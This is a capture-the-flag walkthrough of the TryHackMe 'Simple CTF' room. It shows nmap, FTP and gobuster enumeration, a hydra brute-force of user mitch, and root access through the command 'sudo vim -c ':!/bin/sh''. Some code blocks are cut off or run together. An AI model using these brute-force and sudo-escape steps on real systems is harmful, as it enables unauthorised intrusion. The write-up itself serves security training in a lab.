## Solution

### Check for services with nmap

We start by scanning the machine with `nmap` on all ports

```bash

We have three services running:

- vsftpd v3.0.3 on port 21
- Apache httpd v2.4.18 on port 80
- OpenSSH v7.2p2 on port 2222

Browsing manually to port 80 shows an `Apache2 Ubuntu Default Page`.

### Check for files on the FTP-server

Let's start by checking out the FTP-server

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ ftp 10.10.167.216

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Ah, we have a user (`Mitch`) with a weak password.

### Scan for web content with gobuster

Next, let's try to identify common directories with `gobuster`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.167.216

### Analyse the web page

Checking the web page (`http://10.10.167.216/simple/`) we can see that it is running `CMS Made Simple version v2.2.8`.

We ought to check if there are any know vulnerabilities for this version

### Brute-force the password for Mitch

We can try to brute-force the password for user `mitch` with `hydra`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]

$ ls
user.txt
$ cat user.txt
G<REDACTED>!
$ 
```

We can also check what other users are present on the system

```bash
$ ls -l /home
total 8
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
$ 
```

### Privilege escalation

Let's start our enumeration by checking if we can run commands as root with `sudo -l`

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Yes, we can run `vim` as root without a password!

### Get the root flag

We can use this trick from [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) to get a shell via `vim` and then get the root flag

```bash
$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
W<REDACTED>!
# 
```

Nice!
